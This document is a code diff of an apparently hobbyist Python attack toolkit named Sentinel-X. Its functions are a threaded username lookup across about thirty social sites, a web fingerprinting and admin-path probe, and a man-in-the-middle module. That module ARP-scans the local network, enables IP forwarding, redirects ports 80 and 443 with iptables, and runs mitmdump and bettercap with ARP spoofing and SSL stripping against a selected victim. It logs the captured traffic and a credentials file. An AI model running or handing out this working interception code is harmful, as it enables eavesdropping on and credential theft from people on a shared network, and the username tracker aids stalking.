@@ -13,21 +13,16 @@ import subprocess
 import shutil
 import signal
 
-# --- DEPENDENCY CHECK ---
 try:
     from scapy.all import sniff, ARP, Ether, srp, conf
     conf.verb = 0 
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
-
-# --- SYSTEM INIT ---
 init(autoreset=True)
 engine = pyttsx3.init()
 engine.setProperty('rate', 160) 
 engine.setProperty('volume', 1.0)
-
-# --- UTILITIES ---
 def speak(text):
     try:
         engine.say(text)
@@ -56,17 +51,12 @@ def banner():
 # --- 1. REAL OSINT TRACKER (30+ SITES) ---
 def osint_tracker():
     speak("Global OSINT Tracker initialized.")
-    target = input(Fore.WHITE + "\nroot@sentinel:~/osint# Target Username: ")
-    
+    target = input(Fore.WHITE + "\nroot@sentinel:~/osint# Target Username: ")    
     print(Fore.CYAN + "\n[*] Initializing Search Threads for 30+ Platforms...")
     print(Fore.CYAN + "[*] Please wait, checking databases...\n")
-    
-    # Headers to mimic a real browser (prevents blocking)
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
     }
-
-    # 30+ Real URLs
     sites = {
         "GitHub": f"https://github.com/{target}",
         "Instagram": f"https://www.instagram.com/{target}/",
@@ -101,28 +91,22 @@ def osint_tracker():
         "ProductHunt": f"https://www.producthunt.com/@{target}",
         "Wattpad": f"https://www.wattpad.com/user/{target}",
         "Canva": f"https://www.canva.com/p/{target}",
-        "CodePen": f"https://codepen.io/{target}"
+        "CodePen": f"https://codepen.io/{target}",
+        "GooglePlus": f"https://plus.google.com/{target}/posts"
     }
 
     found_list = []
-    
-    # Threaded Function for Speed
+
     def check_site(site, url):
         try:
             r = requests.get(url, headers=headers, timeout=5)
-            # Most sites return 200 if found. Some (like TikTok) might require specific handling, 
-            # but 200 vs 404 is the standard check.
             if r.status_code == 200:
                 print(Fore.GREEN + f"[+] DETECTED: {site:<15} -> {url}")
                 found_list.append(site)
             elif r.status_code == 404:
-                # Optional: Print missing sites in Red if you want verbose output
-                # print(Fore.RED + f"[-] {site:<15} : NOT FOUND") 
                 pass
         except:
-            pass # Ignore connection errors
-
-    # Launch Threads
+            pass 
     threads = []
     for site, url in sites.items():
         t = threading.Thread(target=check_site, args=(site, url))
@@ -184,18 +168,13 @@ def web_pentest():
     
     try:
         r = requests.get(target, timeout=5)
-        
-        # 1. Server Fingerprinting
         headers = r.headers
         server = headers.get("Server", "Unknown")
-        powered = headers.get("X-Powered-By", "Hidden")
-        
+        powered = headers.get("X-Powered-By", "Hidden")        
         print(Fore.GREEN + "\n--- SERVER FINGERPRINT ---")
         print(f"{Fore.YELLOW}Server OS   : {Fore.WHITE}{server}")
         print(f"{Fore.YELLOW}Technology  : {Fore.WHITE}{powered}")
         print(f"{Fore.YELLOW}Cookies     : {Fore.WHITE}{len(r.cookies)} Detected")
-        
-        # 2. Check for Admin Panels (Real requests)
         print(Fore.CYAN + "\n[*] Scanning for Sensitive Directories...")
         paths = ["/admin", "/login", "/wp-admin", "/robots.txt", "/config"]
         
@@ -243,88 +222,61 @@ def check_dependencies():
 
 # --- 5. FINAL ELITE MITM MODULE ---
 def mitm_simulation():
-    # 1. Pre-Flight Checks
     missing = check_dependencies()
     if missing:
         log(f"Missing tools: {', '.join(missing)}. Install them first!", "ALERT")
         return
-
     os.system('cls' if os.name == 'nt' else 'clear')
-    
-    # Professional Header
     print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
     print(f"{Fore.WHITE}   SENTINEL-X ELITE   |   INTERNAL NETWORK EXPLOITATION V3.0")
     print(f"{Fore.RED}" + "═"*65)
-
-    # 2. Interface & Target Setup
     try:
-        # Auto-detect interfaces
         ifaces = os.listdir('/sys/class/net/')
         print(f"{Fore.YELLOW}[*] Available Interfaces:")
         for i, iface in enumerate(ifaces):
-            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{iface}")
-        
+            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{iface}")        
         if_choice = int(input(f"\n{Fore.YELLOW}Select Interface ID: {Fore.WHITE}"))
         interface = ifaces[if_choice]
-
-        # Scan for targets automatically
         log(f"Broadcasting ARP on {interface}...", "INFO")
         from scapy.all import ARP, Ether, srp
         net_prefix = ".".join(os.popen("hostname -I").read().split()[0].split(".")[:-1]) + ".0/24"
-        print(f"{Fore.CYAN}[?] Scanning default range: {net_prefix}")
-        
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_prefix), timeout=3, iface=interface, verbose=False)
-        
+        print(f"{Fore.CYAN}[?] Scanning default range: {net_prefix}")     
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_prefix), timeout=3, iface=interface, verbose=False)     
         devices = []
         print(f"\n{Fore.MAGENTA}ID\tIP ADDRESS\t\tMAC ADDRESS")
         for i, (s, r) in enumerate(ans):
             devices.append(r.psrc)
-            print(f"{Fore.GREEN}{i}\t{r.psrc:<15}\t{Fore.WHITE}{r.hwsrc}")
-        
+            print(f"{Fore.GREEN}{i}\t{r.psrc:<15}\t{Fore.WHITE}{r.hwsrc}")       
         target_idx = int(input(f"\n{Fore.YELLOW}Select Target ID: {Fore.WHITE}"))
         target_ip = devices[target_idx]
         gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Fore.WHITE}")
-
     except Exception as e:
         log(f"Setup Error: {e}", "ERROR")
         return
-
-    # 3. Log Directory & Files
     log_folder = "sentinel_vault"
     if not os.path.exists(log_folder): os.makedirs(log_folder)
     
     session_id = datetime.now().strftime("%H%M%S")
     pcap_out = f"{log_folder}/session_{session_id}.pcap"
     cred_out = f"{log_folder}/creds_{session_id}.txt"
-
-    # 4. Attack Execution
     try:
         speak("Initializing elite interception engines.")
         log("Hardening Network Configuration...", "INFO")
-        
-        # IP Forwarding & Iptables Cleanup
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        os.system("iptables -t nat -F") # Clear old rules
-        
-        # Routing
+        os.system("iptables -t nat -F") 
         os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
         os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")
-
-        # Launching Mitmproxy (with Stream log)
         mitm_proc = subprocess.Popen(
             ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
-
-        # Launching Bettercap (with SSLStrip & ARP Spoof)
-        # SSLStrip bettercap mein 'http.proxy' se handle hota hai
         better_cmd = [
             "bettercap", "-iface", interface, "-eval", 
             f"set arp.spoof.targets {target_ip}; set http.proxy.sslstrip true; arp.spoof on; net.sniff on"
         ]
         better_proc = subprocess.Popen(better_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        time.sleep(3) # Let engines warm up
+        time.sleep(3) 
 
         # 5. DASHBOARD UI
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -344,20 +296,15 @@ def mitm_simulation():
         
 
         while True:
-            # Check if processes are still alive
             if mitm_proc.poll() is not None or better_proc.poll() is not None:
                 log("One of the engines crashed! Emergency exit.", "ALERT")
                 break
-                
-            # Live traffic animation
             for dot in [".  ", ".. ", "..."]:
                 print(f"{Fore.MAGENTA}\r[+] SNIFFING{dot}", end="")
                 time.sleep(0.5)
 
     except KeyboardInterrupt:
         print(f"\n\n{Fore.YELLOW}[!] TERMINATION SIGNAL RECEIVED.")
-        
-        # Graceful Shutdown
         better_proc.send_signal(signal.SIGINT)
         mitm_proc.send_signal(signal.SIGINT)
         time.sleep(2)
@@ -441,5 +388,6 @@ def main():
 
 if __name__ == "__main__": 
     main()
+
 
 
